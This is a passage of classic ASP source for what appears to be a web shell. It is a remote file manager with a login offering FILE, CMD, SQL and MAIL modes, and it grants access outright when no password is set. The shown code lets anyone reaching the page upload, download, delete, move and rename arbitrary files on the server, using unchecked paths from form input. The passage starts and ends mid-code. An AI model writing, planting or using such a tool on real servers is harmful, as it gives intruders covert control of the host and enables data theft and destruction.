if\n\t\t\telse\n\t\t\t\tgMsg=\"Unable to create the file \"\"\" & itemName & \"\"\", there exists a file or a folder with the same name...\"\n\t\t\tend if\n\tend select\nend sub\n\n'###########################################################################################\n\nsub ZipInfo()\n\tdim path,zip,zipfile,i\n\n\tpath=addslash(targetPath) & Request.Form(\"param\")\n%>\n<html>\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\">\n<title><%=path%></title>\n<style>\nbody,td{font-family:Fixedsys}\na{color:#0000ff}\n</style>\n</head>\n<body bgcolor=#000000 text=#ffffff>\n<p><%=path%>\n<table border=0 cellspacing=1 cellpadding=2 bgcolor=#ff0000>\n<tr bgcolor=#000000>\n <td><font color=#FFFF00>Name</font></td>\n <td align=center><font color=#FFFF00>Size</font></td>\n <td align=center><font color=#FFFF00>Ratio</font></td>\n <td align=center><font color=#FFFF00>Packed</font></td>\n <td align=center><font color=#FFFF00>Modify</font></td>\n <td align=center><font color=#FFFF00>Path</font></td>\n</tr>\n<%\n\tset zip=new clszip\n\tzip.ZipLoad(path)\n\tset zipfile=new clsZipFile\n\n\tfor i=1 to zip.FileCount\n\t\tset zipfile=zip.GetFile(i)\n\t\twith zipfile\n\t\t\tif not (.IsFolder Or .IsOverall) then\n\t\t\t\tResponse.Write \"<tr bgcolor=#000000>\" & vbNewLine\n\t\t\t\tResponse.Write \" <td>\" & .Name & \"</td>\" & vbNewLine\n\t\t\t\tResponse.Write \" <td align=right>\" & FormatNumber(.Size,0) & \"</td>\" & vbNewLine\n\t\t\t\tResponse.Write \" <td align=right>\" & .Ratio & \"</td>\" & vbNewLine\n\t\t\t\tResponse.Write \" <td align=right>\" & FormatNumber(.Packed,0) & \"</td>\" & vbNewLine\n\t\t\t\tResponse.Write \" <td align=center>\" & FormatDate(.Modified) & \"</td>\" & vbNewLine\n\t\t\t\tResponse.Write \" <td>\" & .Path & \"</td>\" & vbNewLine\n\t\t\tend if\n\t\tend with\n\tnext\n\t\n\tset ZipFile=nothing\n\tset zip=nothing\n%>\n</table>\n</p>\n<%\n\tHtmlFooter()\n\tDestroy()\nend sub\n\n'###########################################################################################\n\nsub Delete()\n\tdim i,ndir,nfile,itemName,itemPath\n\n\ton error resume next\n\n\tndir=Request.Form(\"d\").Count\n\tnfile=Request.Form(\"f\").Count\n\n\tif (ndir>0) then\n\t\tgMsg=\"<b>D</b>elete folder(s)...\"\n\t\tfor i=1 to ndir\n\t\t\titemName=Request.Form(\"d\")(i)\n\t\t\titemPath=addslash(targetPath) & itemName\n\t\t\tFSO.DeleteFolder itemPath,true\n\t\t\tgMsg=gMsg & \"<br>\" & vbNewLine & \"- \" & itemName & \": \"\n\t\t\tif Err.Number<>0 then\n\t\t\t\tgMsg=gMsg & \"error\"\n\t\t\telse\n\t\t\t\tgMsg=gMsg & \"success\"\n\t\t\tend if\n\t\tnext\n\tend if\n\n\tif (nfile>0) then\n\t\tif (ndir>0) then gMsg= gMsg & \"<p>\" & vbNewLine\n\t\tgMsg=gMsg & \"<b>D</b>elete file(s)...\"\n\t\tfor i=1 to nfile\n\t\t\titemName=Request.Form(\"f\")(i)\n\t\t\titemPath=addslash(targetPath) & itemName\n\t\t\tFSO.DeleteFile itemPath,true\n\t\t\tgMsg=gMsg & \"<br>\" & vbNewLine & \"- \" & itemName & \": \"\n\t\t\tif Err.Number<>0 then\n\t\t\t\tgMsg=gMsg & \"error\"\n\t\t\telse\n\t\t\t\tgMsg=gMsg & \"success\"\n\t\t\tend if\n\t\tnext\n\tend if\n\nend sub\n\n'###########################################################################################\n\nsub Copy()\n\tdim i,nfile,ndir,itemName,itemPath\n\t\n\ton error resume next\n\n\tcp_dst=Trim(Request.Form(\"cp\"))\n\tif cp_dst=\"\" then exit sub\n\tcp_dst=abspath(cp_dst)\n\tSession(\"cp_dst\")=cp_dst\n\n\tif FSO.FolderExists(cp_dst)=false then\n\t\tgMsg=\"<p>Folder not exists\" & vbNewLine\n\t\texit sub\n\tend if\n\n\tndir=Request.Form(\"d\").Count\n\tnfile=Request.Form(\"f\").Count\n\n\tif (ndir>0) then\n\t\tgMsg=\"<b>C</b>opying folder(s) to \"\"\" & cp_dst & \"\"\" ...\"\n\t\tfor i=1 to ndir\n\t\t\titemName=Request.Form(\"d\")(i)\n\t\t\titemPath=addslash(targetPath) & itemName\n\t\t\tFSO.CopyFolder itemPath,addslash(cp_dst),true\n\t\t\tgMsg=gMsg & \"<br>\" & vbNewLine & \"- \" & itemName & \": \"\n\t\t\tif Err.Number<>0 then\n\t\t\t\tgMsg=gMsg & \"error\"\n\t\t\telse\n\t\t\t\tgMsg=gMsg & \"success\"\n\t\t\tend if\n\t\tnext\n\tend if\n\n\tif (nfile>0) then\n\t\tif (ndir>0) then gMsg= gMsg & \"<p>\" & vbNewLine\n\t\tgMsg=gMsg & \"<b>C</b>opying file(s) to \"\"\" & cp_dst & \"\"\" ...\"\n\t\tfor i=1 to nfile\n\t\t\titemName=Request.Form(\"f\")(i)\n\t\t\titemPath=addslash(targetPath) & itemName\n\t\t\tFSO.CopyFile itemPath,addslash(cp_dst),true\n\t\t\tgMsg=gMsg & \"<br>\" & vbNewLine & \"- \" & itemName & \": \"\n\t\t\tif Err.Number<>0 then gMsg=gMsg & \"error\" else gMsg=gMsg & \"success\"\n\t\tnext\n\tend if\n\nend sub\n\n'###########################################################################################\n\nsub Move()\n\tdim i,nfile,ndir,itemName,itemPath\n\t\n\ton error resume next\n\n\tmv_dst=Trim(Request.Form(\"mv\"))\n\tif mv_dst=\"\" then exit sub\n\tmv_dst=abspath(mv_dst)\n\tSession(\"mv_dst\")=mv_dst\n\n\tif FSO.FolderExists(mv_dst)=false then\n\t\tgMsg=\"<p>Folder not exists\" & vbNewLine\n\t\texit sub\n\tend if\n\n\tndir=Request.Form(\"d\").Count\n\tnfile=Request.Form(\"f\").Count\n\n\tif (ndir>0) then\n\t\tgMsg=\"<b>M</b>oving folder(s) to \"\"\" & mv_dst & \"\"\" ...\"\n\t\tfor i=1 to ndir\n\t\t\titemName=Request.Form(\"d\")(i)\n\t\t\titemPath=addslash(targetPath) & itemName\n\t\t\tgMsg=gMsg & \"<br>\" & vbNewLine & \"- \" & itemName & \": \"\n\t\t\tFSO.MoveFolder itemPath,addslash(mv_dst)\n\t\t\tif Err.Number<>0 then gMsg=gMsg & \"error\" else gMsg=gMsg & \"success\"\n\t\t\tset item=nothing\n\t\tnext\n\tend if\n\n\tif (nfile>0) then\n\t\tif (ndir>0) then gMsg= gMsg & \"<p>\" & vbNewLine\n\t\tgMsg=gMsg & \"<b>M</b>oving file(s) to \"\"\" & mv_dst & \"\"\" ...\"\n\t\tfor i=1 to nfile\n\t\t\titemName=Request.Form(\"f\")(i)\n\t\t\titemPath=addslash(targetPath) & itemName\n\t\t\tgMsg=gMsg & \"<br>\" & vbNewLine & \"- \" & itemName & \": \"\n\t\t\tFSO.MoveFile itemPath,addslash(mv_dst)\n\t\t\tif Err.Number<>0 then gMsg=gMsg & \"error\" else gMsg=gMsg & \"success\"\n\t\tnext\n\tend if\nend sub\n\n'###########################################################################################\n\nsub RenameItem()\n\tdim item,itemType,itemName,itemPath\n\tdim param,newName\n\n\titemType=request.form(\"command\")\n\tparam=split(request.form(\"param\"),\"|\")\n\titemName=param(0)\n\tnewName=param(1)\n\titemPath=addslash(targetPath) & newName\n\n\ton error resume next\n\n\tselect case itemType\n\t\tcase \"RenameFolder\"\n\t\t\tif (FSO.FolderExists(itemPath)=false) and (FSO.FileExists(itemPath)=false) then\n\t\t\t\titemPath=addslash(targetPath) & itemName\n\t\t\t\tset item=FSO.GetFolder(itemPath)\n\t\t\t\titem.Name=newName\n\t\t\t\tif Err.Number<>0 then\n\t\t\t\t\tgMsg=\"Unable to rename the folder \"\"\" & itemName & \"\"\", an error occured...\"\n\t\t\t\telse\n\t\t\t\t\tgMsg=\"Renamed the folder \"\"\" & itemName & \"\"\" to \"\"\" & newName & \"\"\"...\"\n\t\t\t\tend if\n\t\t\telse\n\t\t\t\tgMsg=\"Unable to rename the folder \"\"\" & itemName & \"\"\", there exists a file or a folder with the new name \"\"\" & newName & \"\"\"...\"\n\t\t\tend if\n\t\tcase \"RenameFile\"\n\t\t\tif (FSO.FolderExists(itemPath)=false) and (FSO.FileExists(itemPath)=false) then\n\t\t\t\titemPath=addslash(targetPath) & itemName\n\t\t\t\tset item=FSO.GetFile(itemPath)\n\t\t\t\titem.Name=newName\n\t\t\t\tif Err.Number<>0 then\n\t\t\t\t\tgMsg=\"Unable to rename the file \"\"\" & itemName & \"\"\", an error occured...\"\n\t\t\t\telse\n\t\t\t\t\tgMsg=\"Renamed the file \"\"\" & itemName & \"\"\" to \"\"\" & newName & \"\"\"...\"\n\t\t\t\tend if\n\t\t\telse\n\t\t\t\tgMsg=\"Unable to rename the file \"\"\" & itemName & \"\"\", there exists a file or a folder with the new name \"\"\" & newName & \"\"\"...\"\n\t\t\tend if\n\tend select\n\n\tset item=nothing\nend sub\n\n'###########################################################################################\n\nsub List()\n\tdim objFolder,folder,item,intCount,bOpen,ext,count\n\tif not FSO.FolderExists(targetPath) then\n\t\tgMsg=\"Folder not found\"\n\telse\n\t\ton error resume next\n\t\tset objFolder=FSO.GetFolder(targetPath)\n\t\tif Err.Number<>0 then\n\t\t\tgMsg=\"Can't open folder\"\n\t\telse\n\t\t\tintCount=objFolder.SubFolders.Count+objFolder.Files.Count\n\t\t\tif Err.Number<>0 then\n\t\t\t\tgMsg=\"Permission denied\"\n\t\t\telse\n%>\n<input type=button value=Refresh onclick=\"Command('Refresh')\">\n<input type=button value=\"New File\" onclick=\"Command('NewFile')\">\n<input type=button value=\"New Folder\" onclick=\"Command('NewFolder')\">\n<input type=button value=Upload onclick=\"frmUpload.max.focus()\">\n<input type=button value=Tree onclick=\"Command('Tree')\">\n<%\n\t\t\t\tbOpen=true\n\t\t\tend if\n\t\tend if\n\tend if\n\tHtmlQuick()\n\tif gMsg<>\"\" then Response.Write \"<p>\" & gMsg & vbNewLine\n\tif bOpen then\n\t\tcount=0\n\t\tif intCount>0 then Response.Write \"<p>\" & objFolder.SubFolders.Count & \" subfolder(s)<br>\" & vbNewLine & objFolder.Files.Count & \" file(s)<br>\" & vbNewLine\n\t\tif bSize then Response.Write \"(\" & FormatSize(objFolder.Size) & \")<br>\" & vbNewLine\n%>\n<p>\n<table border=1 width=100%>\n<tr>\n <td><b>N</b>ame</td>\n <td align=center><b>S</b>ize</td>\n <td align=center><b>T</b>ype</td>\n <td align=center><b>M</b>odified</td>\n <td><b>A</b>ttributes</td>\n <td><b>A</b>ctions</td>\n<tr>\n<%\n\t\tif not isroot(targetPath) then\n%>\n<tr>\n <td><a href=\"javascript:Command('LevelRoot')\" title=\"Up Root Level\">\\</a></td>\n <td>&nbsp;</td>\n <td align=center>Root</td>\n <td>&nbsp;</td>\n <td>&nbsp;</td>\n <td>&nbsp;</td>\n</tr>\n<tr>\n <td><a href=\"javascript:Command('LevelUp')\" title=\"Up One level\">..</a></td>\n <td>&nbsp;</td>\n <td align=center>Up</td>\n <td>&nbsp;</td>\n <td>&nbsp;</td>\n <td>&nbsp;</td>\n</tr>\n<%\n\t\tend if\n\t\tif intCount>0 then\n\t\t\tHtmlJsForm()\n%>\n<form name=theForm method=post action=\"<%=gURL%>\">\n<input type=hidden name=command value=\"\">\n<input type=hidden name=folder value=\"<%=targetPath%>\">\n<%\n\t\t\tfor each item in objFolder.SubFolders\n\t\t\t\tcount=count+1\n\t\t\t\tResponse.Write \"<tr>\" & vbNewLine\n\t\t\t\tResponse.Write \" <td><a href=\"\"javascript:Command('OpenFolder',&#34;\" & item.Name & \"&#34;)\"\"\" \n\t\t\t\tif Len(item.Name)>gMax then Response.Write \" title=\"\"\" & item.Name & \"\"\"\"\n\t\t\t\tResponse.Write \">\" & FormatName(item.Name) & \"</a></td>\" & vbNewLine\n\t\t\t\tResponse.Write \" <td align=right>&nbsp;</td>\" & vbNewLine\n\t\t\t\tResponse.Write \" <td align=center>DIR</td>\" & vbNewLine\n\t\t\t\tResponse.Write \" <td align=center>\" & FormatDate(item.DateLastModified ) & \"</td>\" & vbNewLine\n\t\t\t\tResponse.Write \" <td>\" & GetAttributes(item.Attributes) & \"</td>\" & vbNewLine\n\t\t\t\tResponse.Write \" <td><input type=checkbox name=d value=\"\"\" & item.Name & \"\"\"><input type=button value=Ren onclick=\"\"Command('RenameFolder',&#34;\" & item.Name & \"&#34;)\"\"><input type=button value=Attr onclick=\"\"Command('ChangeAttributesFolder',&#34;\" & item.Name & \"&#34;)\"\"></td>\" & vbNewLine\n\t\t\t\tResponse.Write \"</tr>\" & vbNewLine\n\t\t\tnext\n\t\t\tfor each item in objFolder.Files\n\t\t\t\tcount=count+1\n\t\t\t\tResponse.Write \"<tr>\" & vbNewLine\n\t\t\t\tResponse.Write \" <td><a href=\"\"javascript:Command('Download',&#34;\" & item.Name & \"&#34)\"\"\"\n\t\t\t\text=FSO.GetExtensionName(addslash(targetPath) & item.Name)\n\t\t\t\tre.IgnoreCase = true\n\t\t\t\tre.Pattern = \"^\" & ext & \",|,\" & ext & \",|,\" & ext & \"$\"\n\t\t\t\tif re.Test(lnkExt) then\n\t\t\t\t\tResponse.Write \" title=\"\"-&gt; \" & Server.Htmlencode(FindLink(addslash(targetPath) & item.Name)) & \"\"\"\"\n\t\t\t\telseif Len(item.Name)>gMax then\n\t\t\t\t\tResponse.Write \" title=\"\"\" & item.Name & \"\"\"\"\n\t\t\t\tend if\n\n\t\t\t\tResponse.Write \">\" & FormatName(item.Name) & \"</td>\" & vbNewLine\n\t\t\t\tResponse.Write \" <td align=right>\" & FormatSize(item.Size) & \"</td>\" & vbNewLine\n\t\t\t\tResponse.Write \" <td align=center>\" & item.Type & \"</td>\" & vbNewLine\n\t\t\t\tResponse.Write \" <td align=center>\" & FormatDate(item.DateLastModified ) & \"</td>\" & vbNewLine\n\t\t\t\tResponse.Write \" <td>\" & GetAttributes(item.Attributes) & \"</td>\" & vbNewLine\n\t\t\t\tResponse.Write \" <td><input type=checkbox name=f value=\"\"\" & item.Name & \"\"\"><input type=button value=Ren onclick=\"\"Command('RenameFile',&#34;\" & item.Name & \"&#34;)\"\"><input type=button value=Attr onclick=\"\"Command('ChangeAttributesFile',&#34;\" & item.Name & \"&#34;)\"\">\"\n\n\t\t\t\tif re.Test(editExt) then\n\t\t\t\t\tResponse.Write \"<input type=button value=Edit onclick=\"\"Command('Edit',&#34;\" & item.Name & \"&#34;)\"\">\"\n\t\t\t\tend if\n\t\t\t\t\n\t\t\t\tif Lcase(ext)=\"zip\" then\n\t\t\t\t\tResponse.Write \"<input type=button value=Info onclick=\"\"Command('ZipInfo',&#34;\" & item.Name & \"&#34;)\"\">\"\n\t\t\t\tend if\n\n\t\t\t\tResponse.Write \"</td>\" & vbNewLine\n\t\t\t\tResponse.Write \"</tr>\" & vbNewLine\n\t\t\tnext\n\t\t\tif count>0 then\n%>\n<tr>\n <td>&nbsp;</td>\n <td>&nbsp;</td>\n <td>&nbsp;</td>\n <td>&nbsp;</td>\n <td>&nbsp;</td>\n <td><input type=checkbox name=allbox title=\"Select All\" onclick=\"CheckAll()\"><input type=button value=Delete title=\"Delete Selected Item(s)\" onclick=\"DoWork('Delete')\"></td>\n</tr>\n<%\n\t\t\tend if\n%>\n</table>\n<%\n\t\tif count>1 then\n%>\n<p>\n<table>\n<tr><td><b>C</b>opy selected item(s) to</td><td><input type=text name=cp value=\"<%=Session(\"cp_dst\")%>\" size=50 onkeydown=\" if (event.keyCode==13) theForm.cp_bt.click();\"> <input type=button id=cp_bt value=Copy onclick=\"DoWork('Copy')\"></td></tr>\n<tr><td><b>M</b>ove selected item(s) to</td><td><input type=text name=mv value=\"<%=Session(\"mv_dst\")%>\" size=50 onkeydown=\" if (event.keyCode==13) theForm.mv_bt.click();\"> <input type=\"button\" id=mv_bt value=Move onclick=\"DoWork('Move')\"></td></tr>\n</table>\n<%\n\tend if\n%>\n</form>\n</table>\n<%\n\t\tend if\n\t\tset objFolder=nothing\n%>\n<p><b>U</b>pload file(s) to \"<%=targetPath%>\"\n<form name=frmUpload method=post enctype=\"multipart/form-data\" action=\"<%=gURL%>\">\n<input type=hidden name=folder value=\"<%=targetPath%>\">\nMax: <input type=text name=max value=5 size=5> <input type=button value=# onclick=\"setid()\"><br>\n<table>\n<tr>\n<td id=upid>\n</td>\n</tr>\n</table>\n<input type=submit value=Upload>\n</form>\n<script>\nsetid();\nfunction setid() {\n\tstr='<br>';\n\tif (frmUpload.max.value<=0) frmUpload.max.value=1;\n\tfor (i=1; i<=frmUpload.max.value; i++) str+='File '+i+': <input type=file name=file'+i+'><br>';\n\tupid.innerHTML=str+'<br>';\n}\n</script>\n<%\n\tend if\n%>\n<form name=frmFile method=post action=\"<%=gURL%>\">\n<input type=hidden name=command value=\"\">\n<input type=hidden name=param value=\"\">\n<input type=hidden name=folder value=\"<%=targetPath%>\">\n</form>\n<script>frmAddress.param.focus()</script>\n<%\n\tHtmlJsCommand()\nend sub\n\n'###########################################################################################\n\nsub Upload()\n\tdim objUpload,f,max,i,name,path,size,success\n\t\n\tHtmlHeader(\"\")\n\tHtmlMode()\n\t\n\tset objUpload=New clsUpload\n\n\ttargetPath=objUpload.Fields(\"folder\").Value\n\tmax=objUpload.Fields(\"max\").Value\n\n\tgMsg= \"<b>U</b>pload...\" & vbNewLine\n\n\tfor i=1 to max\n\t\tname=objUpload.Fields(\"file\" & i).FileName\n\t\tsize=objUpload.Fields(\"file\" & i).Length\n\t\tif (name<>\"\") and (size>0) then\n\t\t\tgMsg=gMsg & \"<br>\" & vbNewLine & \"- \" & name & \" (\" & FormatNumber(size,0) & \" bytes): \"\n\t\t\tpath=addslash(targetPath) & name\n\t\t\tobjUpload.Fields(\"file\" & i).SaveAs path\n\t\t\tif FSO.FileExists(path) then\n\t\t\t\ton error resume next\n\t\t\t\tset f=FSO.GetFile(path)\n\t\t\t\tif IsObject(f) then\n\t\t\t\t\tif f.Size=size then success=true else success=false\n\t\t\t\tend if\n\t\t\t\tset f=nothing\n\t\t\tend if\n\t\t\tif success then  gMsg=gMsg & \"success\" else gMsg = gMsg & \"fail\"\n\t\tend if\n\tnext\n\n\tset objUpload=nothing\n\n\tList()\n\tHtmlFooter()\n\tDestroy()\nend sub\n\n'###########################################################################################\n\nsub Download()\n\tdim oStream\n\tdim szFileName\n\tszFileName=addslash(Request.Form(\"folder\")) & Request.form(\"Param\")\n\tif FSO.FileExists(szFileName) then\n\t\tset oStream=Server.CreateObject(\"ADODB.Stream\")\n\t\toStream.Type=1\n\t\toStream.Open\n\t\ton error resume next\n\t\toStream.LoadFromFile(szFileName)\n\t\tif Err.Number=0 then\n\t\t\tResponse.AddHeader \"Content-Disposition\", \"attachment; filename=\" & FSO.GetFileName(szFileName)\n\t\t\tResponse.AddHeader \"Content-Length\", oStream.Size\n\t\t\tResponse.ContentType=\"bad/type\" 'yeu cau ie hien hop thoai save-as\n\t\t\tResponse.BinaryWrite oStream.Read\n\t\tend if\n\t\toStream.Close\n\t\tset oStream=nothing\n\tend if\n\tDestroy()\nend sub\n\n'###########################################################################################\n\nsub Logout()\n\tSession.Abandon\n\tResponse.Redirect gURL\n\tDestroy()\nend sub\n\nsub Init()\n\tSession(\"switch\")=false\n\tset FSO=Server.CreateObject(\"Scripting.FileSystemObject\")\n\tset re=new regexp\nend sub\n\nsub Destroy()\n\tset FSO=nothing\n\tset re=nothing\n\tResponse.End\nend sub\n\n'###########################################################################################\n\nsub Secure()\n\tif (Session(\"allow\")=1) then exit sub\n\tif (gPassword=\"\") then\n\t\tSession(\"allow\")=1\n\t\tSession(\"mode\")=0\n\t\texit sub\n\tend if\n\tif (Request.Form(\"command\")=\"Login\") then\n\t\tif Request.Form(\"password\")=gPassword then\n\t\t\tSession(\"allow\")=1\n\t\t\tSession(\"mode\")=CInt(Request.Form(\"mode\"))\n\t\t\texit sub\n\t\tend if\n\tend if\n\n\tHtmlHeader(\"\")\n%>\n<form name=frmLogin method=post action=\"<%=gURL%>\">\n<table>\n<tr>\n <td><b>M</b>ode:</td>\n <td>\n  <select name=mode>\n   <option value=0 selected>FILE\n   <option value=1>CMD\n   <option value=2>SQL\n   <option value=3>MAIL\n  </select>\n </td>\n</tr>\n<tr>\n <td><b>P</b>assword:</td>\n <td><input type=password name=password></td>\n</tr>\n<tr>\n <td colspan=2><input type=submit name=command value=Login></td>\n</tr>\n</table>\n</form>\n<script>frmLogin.password.focus()</script>\n<%\n\tHtmlFooter()\n\tDestroy()\nend sub\n\n'###########################################################################################\n\nsub HtmlJsForm()\n%>\n<script>\nfunction CheckAll() {\n\tvar fmobj=document.theForm;\n\tfor (var i=0; i<fmobj.elements.length;i++) {\n\t\tvar e=fmobj.elements[i];\n\t\tif ((e.name!='allbox') && (e.type=='checkbox') && (!e.disabled)) {\n\t\t\te.checked=fmobj.allbox.checked;\n\t\t}\n\t}\n\tif (fmobj.allbox.checked) {\n\t\tfmobj.allbox.title='Clear All';\n\t} else {\n\t\tfmobj.allbox.title='Select All';\n\t}\n}\n\nfunction DoWork(cmd) {\n\tvar s;\n\tvar fmobj=document.theForm;\n\tvar total=0;\n\tfor (var i=0; i<fmobj.elements.length; i++) {\n\t\tvar e=fmobj.elements[i];\n\t\tif ((e.name!='allbox') && (e.type=='checkbox') && (e.checked)) total++;\n\t}\n\n\tif (total<1) return;\n\t\n\ts=(total>1)?'s':'';\n\n\tswitch (cmd) {\n\t\tcase \"Delete\":\n\t\t\tif (!confirm('Are you sure to delete ' + total + ' selected item' + s + ' ?')) return;\n\t\t\tbreak;\n\t\tcase \"Move\":\n\t\t\tvar mv=fmobj.mv.value;\n\t\t\tvar re1=/^\\s*[A-Z]{1}:[^\\\"\\*\\?\\<\\>\\|]*\\s*$/gi;\n\t\t\tvar re2=/^\\s*:{1}[^\\s]+/gi;\n\t\t\tif (mv=='') return;\n\t\t\tif ( re1.test(mv) || re2.test(mv) ){\n\t\t\t\tif (!confirm('Are you sure to move ' + total + ' selected item' + s + ' to \"' + mv + '\" ?')) return;\n\t\t\t} else {\n\t\t\t\talert('Invalid path name !');\n\t\t\t\treturn;\n\t\t\t}\n\t\t\tbreak;\n\t\tcase \"Copy\":\n\t\t\tvar cp=fmobj.cp.value;\n\t\t\tvar re1=/^\\s*[A-Z]{1}:[^\\\"\\*\\?\\<\\>\\|]*\\s*$/gi;\n\t\t\tvar re2=/^\\s*:{1}[^\\s]+/gi;\n\t\t\tif (cp=='') return;\n\t\t\tif ( re1.test(cp) || re2.test(cp) ) {\n\t\t\t} else {\n\t\t\t\talert('Invalid path name !');\n\t\t\t\treturn;\n\t\t\t}\n\t\t\tbreak;\n\t\tdefault:\n\t\t\treturn;\n\t}\n\n\tfmobj.command.value=cmd;\n\tfmobj.submit();\n}\n</script>\n<%\nend sub\n\n'###########################################################################################\n\nsub HtmlJsCommand()\n%>\n<script>\n\tfunction openWin(winName, urlLoc, w, h, showStatus, isViewer) {\n\t\tl = (screen.availWidth - w)/2;\n\t\tt = (screen.availHeight - h)/2;\n\t\tfeatures  = \"toolbar=no\";      // yes|no \n\t\tfeatures += \",location=no\";    // yes|no \n\t\tfeatures += \",directories=no\"; // yes|no \n\t\tfeatures += \",status=\" + (showStatus?\"yes\":\"no\");  // yes|no \n\t\tfeatures += \",menubar=no\";     // yes|no \n\t\tfeatures += \",scrollbars=\" + (isViewer?\"yes\":\"no\");   // auto|yes|no \n\t\tfeatures += \",resizable=\" + (isViewer?\"yes\":\"no\");   // yes|no \n\t\tfeatures += \",dependent\";      // close the parent, close the popup, omit if you want otherwise \n\t\tfeatures += \",height=\" + h;\n\t\tfeatures += \",width=\" + w;\n\t\tfeatures += \",left=\" + l;\n\t\tfeatures += \",top=\" + t;\n\t\twinName = winName.replace(/[^a-z]/gi,\"_\");\n\t\treturn window.open(urlLoc,winName,features);\n\t} \n\t\n\tfunction createPage (theWin, cmd, param){\n\t\tfrmFile.target = theWin.name;\n\t\tfrmFile.command.value = cmd;\n\t\tfrmFile.param.value = param;\n\t\tfrmFile.submit();\n\t}\n\n\tfunction CheckName(str) {\n\t\tvar re;\n\t\tre = /[\\\\/:*?\"<>|]/gi;\n\t\tif (re.test(str)) return false;\t\n\t\telse return true;\n\t}\t\n\n\tfunction Command(cmd, param) {\n\t\tvar str;\n\t\tvar someWin;\n\t\tswitch (cmd) {\n\t\t\tcase \"Tree\":\n\t\t\t\tstr = prompt(\"Please enter a name for the folder to tree\", frmFile.folder.value);\n\t\t\t\tif (!str) return;\n\t\t\t\tvar re1=/^\\s*[A-Z]{1}:[^\\\"\\*\\?\\<\\>\\|]*\\s*$/gi;\n\t\t\t\tvar re2=/^\\s*:{1}[^\\s]+/gi;\n\t\t\t\tif (re1.test(str) || re2.test(str)) {\n\t\t\t\t\tvar winName=cmd + document.forms.frmFile.param.value;\n\t\t\t\t\tparam=str;\n\t\t\t\t\tdocument.forms.frmFile.param.value=param;\n\t\t\t\t\twinName=winName.replace(/[^a-z]/gi,\"_\");\n\t\t\t\t\tsomeWin=window.open(\"\", winName, \"toolbar=yes,location=no,directories=no,status=yes,menubar=yes,scrollbars=yes,resizable=yes\");\n\t\t\t\t\tsomeWin.focus();\n\t\t\t\t\tcreatePage(someWin,cmd,param);\n\t\t\t\t\tsomeWin = null;\n\t\t\t\t\treturn;\n\t\t\t\t}\n\t\t\t\telse {\n\t\t\t\t\talert('Invalid path name !');\n\t\t\t\t\treturn;\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\tcase \"NewFile\":\n\t\t\t\tstr = prompt(\"Please enter a name for the new file\", \"New File\");\n\t\t\t\tif(!str) return;\n\t\t\t\telse if (!CheckName(str)) {alert(\"File name can not contain any of the\\nfollowing characters: \\\\ / : * ? \\\" < > |\"); return;}\n\t\t\t\tfrmFile.param.value = str;\n\t\t\t\tbreak;\n\t\t\tcase \"NewFolder\":\n\t\t\t\tstr = prompt(\"Please enter a name for the new folder\", \"New Folder\");\n\t\t\t\tif(!str) return;\n\t\t\t\telse if (!CheckName(str)) {alert(\"Folder name can not contain any of the\\nfollowing characters: \\\\ / : * ? \\\" < > |\"); return;}\n\t\t\t\tfrmFile.param.value = str;\n\t\t\t\tbreak;\n\t\t\t\t\t\tcase \"RenameFile\":\n\t\t\t\tstr = prompt(\"Please enter the new name for the file\", param);\n\t\t\t\tif (!str || (str==param)) return;\n\t\t\t\telse if (!CheckName(str)) {alert(\"File name can not contain any of the\\nfollowing characters: \\\\ / : * ? \\\" < > |\"); return;}\n\t\t\t\tfrmFile.param.value = param + \"|\" + str;\n\t\t\t\tbreak;\n\t\t\tcase \"RenameFolder\":\n\t\t\t\tstr = prompt(\"Please enter the new name for the folder\", param);\n\t\t\t\tif (!str || (str==param)) return;\n\t\t\t\telse if (!CheckName(str)) {alert(\"Folder name can not contain any of the\\nfollowing characters: \\\\ / : * ? \\\" < > |\"); return;}\n\t\t\t\tfrmFile.param.value = param + \"|\" + str;\n\t\t\t\tbreak;\n\t\t\tcase \"Edit\":\n\t\t\t\tstr = frmFile.folder.value + param;\n\t\t\t\tsomeWin = openWin(cmd + str, \"\", 600, 440, true, false);\n\t\t\t\tsomeWin.focus();\n\t\t\t\tcreatePage(someWin,cmd,param);\n\t\t\t\tsomeWin = null;\n\t\t\t\treturn;\n\t\t\t\tbreak;\n\t\t\tcase \"ChangeAttributesFile\":\n\t\t\tcase \"ChangeAttributesFolder\":\n\t\t\t\tstr = frmFile.folder.value + param;\n\t\t\t\tsomeWin = openWin(cmd + str, \"\", 300, 160, true, false);\n\t\t\t\tsomeWin.focus();\n\t\t\t\tcreatePage(someWin,cmd,param);\n\t\t\t\tsomeWin = null;\n\t\t\t\treturn;\n\t\t\t\tbreak;\n\t\t\tcase \"ZipInfo\":\n\t\t\t\tvar winName=cmd + document.forms.frmFile.folder.value + param;\n\t\t\t\twinName=winName.replace(/[^a-z]/gi,\"_\");\n\t\t\t\tsomeWin=window.open(\"\", winName, \"toolbar=yes,location=no,directories=no,status=yes,menubar=yes,scrollbars=yes,resizable=yes\");\n\t\t\t\tsomeWin.focus();\n\t\t\t\tcreatePage(someWin,cmd,param);\n\t\t\t\tsomeWin = null;\n\t\t\t\treturn;\n\t\t\t\tbreak\n\t\t\tdefault:\n\t\t\t\tfrmFile.param.value = param;\n\t\t}\n\t\tfrmFile.target = \"\";\n\t\tfrmFile.command.value = cmd\n\t\tfrmFile.submit();\t\n\t}\n</script>\n<%\nend sub\n\nsub HtmlJsEditor()\n%>\n<script>\n\tfunction EditorCommand (cmd) {\n\t\tswitch (cmd) {\n\t\t\tcase \"WordWrap\":\n\t\t\t\tif (frmFile.wrap.checked) frmFile.content.wrap=\"soft\";\n\t\t\t\telse frmFile.content.wrap=\"off\";\n\t\t\t\tfrmFile.content.focus();\n\t\t\t\tbreak;\n\t\t\tcase \"Reload\":\n\t\t\t\tfrmFile.reset();\n\t\t\t\tbreak;\n\t\t\tcase \"Save\":\n\t\t\t\tfrmFile.subcommand.value = \"Save\";\n\t\t\t\tfrmFile.submit();\n\t\t\t\tbreak;\n\t\t\tcase \"SaveAs\":\n\t\t\t\tvar str, oldname;\n\t\t\t\toldname = frmFile.param.value;\n\t\t\t\tstr = prompt(\"Save the file as :\", oldname);\n\t\t\t\tif (!str || str==oldname) return;\n\t\t\t\tfrmFile.param.value = str;\n\t\t\t\tfrmFile.subcommand.value = \"SaveAs\";\n\t\t\t\tfrmFile.submit();\n\t\t\t\tbreak;\n\t\t}\n\t}\n</script>\n<%\nend sub\n\nsub HtmlQuick()\n%>\n<form name=frmQuick method=post action=\"<%=gURL%>\">\n<input type=hidden name=command value=OpenFolder>\n<select name=param 